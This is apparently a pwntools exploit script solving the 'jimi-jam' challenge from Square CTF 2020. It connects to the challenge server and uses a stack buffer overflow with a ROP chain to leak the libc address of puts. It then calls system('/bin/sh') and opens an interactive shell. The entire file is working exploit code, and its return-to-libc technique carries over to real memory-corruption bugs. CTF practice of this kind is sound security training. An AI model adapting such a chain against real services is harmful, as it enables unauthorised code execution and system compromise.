from pwn import *
from struct import pack, unpack

elf = context.binary = ELF("./jimi-jam")
libc = ELF('./libc.so.6')
# context.log_level = 'debug'


# p = gdb.debug(elf.path, '''
#     b *vuln+47
# 	c
# ''')


# env = {"LD_LIBRARY_PATH": "./libc.so.6"}
# p = process(elf.path, env=env)


p = remote('challenges.2020.squarectf.com', 9000)

print(p.recvline())
ROPJAIL = p.recvline().decode()
parts = ROPJAIL.split(' ')
parts = list(map(lambda x: x.strip(), parts))
ROPJAIL = int(parts[-1], 16)

print("ROPJAIL ADDRESS: {}".format(hex(ROPJAIL)))

# POP_RDI_RET = ROPJAIL + 0x11ac   # z randomowej tablicy - nie dziala, bo nie ma tam RX permów
POP_RDI_RET = ROPJAIL - 0x2cbd
RET_GADGET = ROPJAIL - 0x3046
print("POP_RDI_RET ADDRESS: {}".format(hex(POP_RDI_RET)))
print(p.recvline())


buf = b'A' * 8   # fill local array
buf += b'B' * 8  # fill rbp


PLT_PUTS  = ROPJAIL - 0x2fb0
VULN_PUTS = ROPJAIL - 0x2de4
GOT_PUTS  = ROPJAIL - 0xc0
MAIN      = ROPJAIL - 0x2dc6


buf += p64(POP_RDI_RET)
buf += p64(GOT_PUTS)
buf += p64(PLT_PUTS)
buf += p64(MAIN)


p.sendline(buf)
data = p.recvline().strip()
print(data)
GLIBC_PUTS = int.from_bytes(data, 'little')
print("Leaked GLIBC {}".format(hex(GLIBC_PUTS)))
GLIBC_BASE = GLIBC_PUTS - libc.symbols['puts']
print("GLIBC_BASE {}".format(hex(GLIBC_BASE)))

STRING_BIN_SH = GLIBC_BASE + 0x1b75aa
SYSTEM = GLIBC_BASE + libc.symbols['system']
EXIT = GLIBC_BASE + libc.symbols['exit']
PUTS = GLIBC_BASE + libc.symbols['puts']

# main again
print(p.recvline())
print(p.recvline())
print(p.recvline())


buf = b'A' * 8   # fill local array
buf += b'B' * 8  # fill rbp
buf += p64(RET_GADGET)
buf += p64(POP_RDI_RET)
buf += p64(STRING_BIN_SH)
buf += p64(SYSTEM)

p.sendline(buf)

p.interactive()

